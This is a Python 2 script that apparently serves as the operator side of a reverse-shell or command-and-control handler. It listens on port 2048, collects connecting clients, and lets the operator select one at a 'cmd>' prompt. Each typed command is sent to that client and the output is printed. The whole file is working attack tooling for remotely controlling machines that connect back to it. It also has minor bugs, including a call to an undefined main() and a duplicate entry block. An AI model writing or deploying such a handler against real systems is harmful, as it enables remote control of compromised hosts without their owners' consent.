#!/usr/bin/python
import logging
import threading
import socket
import time


class sock(object):
    def __init__(self, host, port):
        self.host = host
        self.port = int(port)
        self.conn_list = {}

    def create_socket(self, max_conn):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        self.sock.listen(max_conn)
        logger.debug("[+] Created socket")

    def accept_conn(self):
        while True:
            self.cSock, self.cAddr = self.sock.accept()
            logger.debug("[+] Got new connection from {}".format(self.cAddr))
            self.conn_list[self.cAddr] = self.cSock
    def update_conn(self):
        for conn in self.conn_list.keys():
            sckt = self.conn_list[conn]
            sckt.settimeout(5)
            recvd = ""
            try:
                sckt.send('fffff')
                recvd = sckt.recv(2048)
            except:
                del self.conn_list[conn]
            if not recvd:
                del self.conn_list[conn]
        return

    def send_command(self):
        self.currSock = ""
        self.currConn = ""
        selected_sock = False
        first_time = True
        while True:
            if not self.conn_list:
                if first_time:
                    logger.debug("[+] Waiting for client connections")
                    first_time = False
                time.sleep(0.25)
                continue
            else:
                self.cmd = raw_input("cmd> ")
                self.cmd = self.cmd.strip('\n').strip(' ')
                if not (self.currSock and selected_sock) and not self.cmd.startswith('select ') and self.cmd != 'list_conn':
                    logger.debug("[+] Select a client socket")
                    logger.debug("[+] Run 'list_conn' to get connection list")
                    logger.debug("[+] Use 'select id' to select a connection socket")
                    continue
                elif self.cmd == 'list_conn':
                    self.list_conn()
                elif self.cmd.startswith('select '):
                    try:
                        self.selection_id = int(self.cmd.split(' ')[1])
                        self.select_conn()
                        selected_sock = True
                        continue
                    except:
                        logger.debug('[!] Enter a valid selection id')
                        continue

                elif self.cmd == '':
                    logger.debug("[-] No commands passed")
                    continue
                elif self.cmd == 'quit':
                    try:
                        self.currSock.close()
                        del self.conn_list[self.currConn]
                        logger.debug("[+] Closed current connection")
                        if not self.conn_list:
                            logger.debug("[+] Waiting for new connection")
                        continue
                    except:
                        logger.debug("[-] Error while closing connection")
                        continue

                elif self.cmd == 'update':
                    self.update_conn()
                    continue

                else:
                    data = ""
                    try:
                        self.currSock.send(self.cmd)
                        data = self.currSock.recv(65535)
                    except Exception as e:
                        print str(e)
                    print data
                    continue

    def list_conn(self):
        for id, conn in enumerate(self.conn_list.keys()):
            print "{}\t{}".format(id, conn)
        return

    def select_conn(self):
        index = self.conn_list.keys()[self.selection_id]
        logger.debug("[+] selected {}".format(self.conn_list[index]))
        self.currSock = self.conn_list[index]
        self.currSock.settimeout(10)
        self.currConn = index
        return

if __name__ == '__main__':
    logger = logging.getLogger(__name__)
    logger.setLevel(logging.DEBUG)
    formatter = logging.Formatter('%(message)s')
    stream_handler = logging.StreamHandler()
    stream_handler.setFormatter(formatter)
    logger.addHandler(stream_handler)

    worker = sock('0.0.0.0', 2048)
    worker.create_socket(5)
    listener = threading.Thread(target=worker.accept_conn, args=())
    listener.start()
    commander = threading.Thread(target=worker.send_command, args=())
    commander.start()
    commander.join()
    listener.join()


if __name__ == '__main__':
    main()
